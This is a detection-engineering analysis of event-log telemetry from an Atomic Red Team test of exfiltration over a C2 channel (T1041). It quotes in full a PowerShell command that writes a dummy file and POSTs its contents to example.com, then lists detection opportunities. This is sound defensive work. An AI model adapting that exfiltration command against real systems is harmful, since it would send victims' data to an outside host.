# T1041-1: Exfiltration Over C2 Channel — C2 Data Exfiltration

## Technique Context

T1041 (Exfiltration Over C2 Channel) describes adversaries sending stolen data over their existing command and control channel rather than establishing separate exfiltration infrastructure. This technique is attractive to attackers because it blends exfiltration traffic with normal C2 communications, making detection more challenging. The detection community typically focuses on identifying unusual outbound data volumes, connections to suspicious domains, and PowerShell web requests that could indicate data exfiltration attempts.

In this Atomic Red Team test, the technique simulates exfiltration by creating a test file with 100 lines of data, then attempting to POST this content to example.com using PowerShell's `Invoke-WebRequest` cmdlet. This represents a common exfiltration vector where PowerShell is used to transmit data over HTTP/HTTPS.

## What This Dataset Contains

The dataset captures a complete PowerShell-based exfiltration attempt. Security event 4688 shows the PowerShell process creation with the full command line: `"powershell.exe" & {if(-not (Test-Path $env:TEMP\LineNumbers.txt)){ 1..100 | ForEach-Object { Add-Content -Path $env:TEMP\LineNumbers.txt -Value "This is line $_." }}[System.Net.ServicePointManager]::Expect100Continue = $false$filecontent = Get-Content -Path $env:TEMP\LineNumbers.txtInvoke-WebRequest -Uri example.com -Method POST -Body $filecontent -DisableKeepAlive}`.

PowerShell script block logging (event 4104) captures the actual exfiltration script, while module logging (event 4103) shows the sequence of cmdlet executions: `Test-Path` checking for the LineNumbers.txt file, `Get-Content` reading the file, and critically, `Invoke-WebRequest` with parameters showing the POST method, target URI "example.com", and the body content containing the exfiltrated data ("This is line 1., This is line 2., ...").

A PowerShell error (event 4100) reveals that the web request failed with "The remote server returned an error: (405) Method Not Allowed", indicating that example.com rejected the POST request but confirming the exfiltration attempt was made.

Sysmon provides process creation events for both the parent PowerShell process (PID 7172) and child PowerShell process (PID 7872) that executed the exfiltration script. Image load events (EID 7) show the loading of urlmon.dll, which is used by PowerShell for web requests. However, notably absent are Sysmon network connection events (EID 3), likely due to the connection failure or filtering in the sysmon-modular configuration.

## What This Dataset Does Not Contain

The dataset lacks Sysmon network connection telemetry (EID 3) that would typically show the outbound HTTP connection to example.com. This absence could be due to the connection failing before establishment, Windows Defender blocking the connection, or sysmon-modular filtering rules. The test file creation in `$env:TEMP\LineNumbers.txt` is not captured in Sysmon file creation events, suggesting it may have been filtered out or occurred outside the monitoring scope.

DNS query events (EID 22) for resolving example.com are also missing, which would typically accompany web requests. Additionally, while PowerShell module logging captured the cmdlet invocations, there are no events showing the actual file content being staged for exfiltration beyond the truncated preview in the command invocation logs.

## Assessment

This dataset provides excellent coverage for detecting PowerShell-based exfiltration attempts through multiple complementary telemetry sources. The Security channel's command-line logging captures the complete attack vector, while PowerShell's script block and module logging provide granular visibility into the exfiltration logic and execution flow. The combination allows detection engineers to identify both the technique execution and understand the attacker's intent.

The failure of the actual network connection (evidenced by the HTTP 405 error) doesn't diminish the dataset's value for detection purposes, as the malicious intent and attempt are clearly documented. The missing network telemetry is a limitation but doesn't prevent building effective detections based on the process execution and PowerShell activity patterns present.

## Detection Opportunities Present in This Data

1. **PowerShell web request with POST method and data payload** - Monitor event 4103 for Invoke-WebRequest cmdlet invocations with Method=POST and Body parameters containing data, especially when the body contains file content or structured data patterns.

2. **PowerShell script block containing Invoke-WebRequest with external domains** - Alert on event 4104 script blocks that combine file reading operations (Get-Content) with web requests to external domains, particularly when using POST methods.

3. **Process command line containing data exfiltration pattern** - Detect Security event 4688 with command lines that include both file content gathering (Get-Content, Add-Content) and web request cmdlets (Invoke-WebRequest) in the same execution context.

4. **PowerShell error events indicating blocked exfiltration attempts** - Monitor event 4100 for web request failures that may indicate blocked or failed exfiltration attempts, especially HTTP 405 Method Not Allowed errors on POST requests.

5. **PowerShell ServicePointManager configuration changes** - Watch for script blocks modifying System.Net.ServicePointManager properties like Expect100Continue, which may indicate attempts to optimize data transmission for exfiltration.

6. **Sequential PowerShell cmdlet execution pattern** - Correlate events 4103 showing Test-Path, Get-Content, and Invoke-WebRequest cmdlets executed in sequence within the same PowerShell session, indicating potential data staging and exfiltration workflow.
